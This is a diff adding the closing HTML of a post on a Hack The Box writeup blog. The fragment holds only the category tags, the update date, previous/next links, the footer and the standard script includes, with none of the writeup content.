+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-09-19T00:00:00+02:00">September 19, 2020</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-travel/" class="pagination--pager" title="Travel - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-admirer/" class="pagination--pager" title="Admirer - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
